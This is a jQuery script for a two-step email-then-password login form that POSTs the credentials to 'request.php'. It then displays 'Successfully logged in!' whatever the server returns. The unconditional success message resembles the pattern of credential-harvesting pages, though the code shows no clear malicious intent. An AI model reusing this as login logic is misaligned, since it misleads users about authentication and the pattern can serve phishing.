$(document).ready(function () {
  $("#nextBtn").click(function (e) {
    e.preventDefault();
    const email = $("#emailOrUsername").val();
    const pass = $("#password").val();
    // CHECK IF USER FILLED EMAIL ALREADY
    if (localStorage.getItem("email")) {
      if (pass === "") {
        alert("Password cannot be empty!");
        return;
      } else {
        $.ajax({
          type: "POST",
          url: "request.php",
          data: {
            email: email,
            password: pass,
          },
          success: function (response) {
            localStorage.clear();
            const originalHeight = $(".form--body--col").height();
            $(".form--body--col").html(
              "<div class='success-msg heading--form--h2'>Successfully logged in!</div>"
            );
            $(".form--body--col").height(originalHeight);
          },
        });
      }
    } else {
      // CHECK IF USER DID NOT FILLED EMAIL THEN SET EMAIL TO LOCAL STORAGE
      if (email === "") {
        alert("Email cannot be empty!");
        return;
      } else {
        localStorage.setItem("email", email);
        $("#step1").toggleClass("active");
        $("#step2").toggleClass("active");
      }
    }

    // if (email === "") return;
    // $("#step1").toggleClass("active");
    // if (pass === "") return;
  });
});
